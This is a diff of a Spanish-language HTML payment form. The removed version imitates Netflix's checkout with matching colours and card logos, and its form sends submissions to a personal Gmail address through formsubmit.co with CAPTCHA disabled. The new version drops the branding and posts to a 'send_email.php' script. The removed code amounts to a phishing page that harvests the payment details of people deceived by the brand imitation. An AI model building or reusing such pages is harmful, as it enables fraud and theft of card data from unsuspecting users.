@@ -3,23 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pasarela de Pago - Netflix</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <title>Pasarela de Pago</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background-color: #141414;
-            color: white;
+            background-color: #f4f4f4;
+            color: #333;
             margin: 0;
             padding: 0;
         }
         .container {
             max-width: 400px;
             margin: 100px auto;
-            background: #222;
+            background: white;
             padding: 20px;
             border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
         h2 {
             text-align: center;
@@ -35,47 +34,31 @@
         input[type="text"],
         input[type="email"],
         input[type="number"],
-        input[type="submit"],
         button {
             width: 100%;
             padding: 10px;
-            border: 1px solid #555;
+            border: 1px solid #ccc;
             border-radius: 5px;
-            background: #333;
-            color: white;
+            background: #f9f9f9;
+            color: #333;
         }
         button {
-            background-color: #e50914;
+            background-color: #28a745;
             border: none;
+            color: white;
             cursor: pointer;
             font-weight: bold;
         }
         button:hover {
-            background-color: #f40612;
-        }
-        .payment-methods {
-            text-align: center;
-            margin-top: 20px;
-        }
-        .payment-methods i {
-            font-size: 24px;
-            margin: 0 10px;
-            color: white;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #999;
+            background-color: #218838;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Pago Seguro</h2>
-    <form action="https://formsubmit.co/espanajuegosplay2025@gmail.com" method="POST">
-        <input type="hidden" name="_captcha" value="false"> <!-- Deshabilitar CAPTCHA -->
+    <h2>Pasarela de Pago</h2>
+    <form action="send_email.php" method="POST">
         <div class="form-group">
             <label for="name">Nombre Completo</label>
             <input type="text" id="name" name="name" required>
@@ -98,15 +81,6 @@
         </div>
         <button type="submit">Pagar</button>
     </form>
-    <div class="payment-methods">
-        <h3>Métodos de Pago Aceptados</h3>
-        <i class="fab fa-cc-visa"></i>
-        <i class="fab fa-cc-mastercard"></i>
-        <i class="fab fa-cc-paypal"></i>
-    </div>
-    <div class="footer">
-        <p>Este es un ejemplo de pasarela de pago.</p>
-    </div>
 </div>
 
 </body>
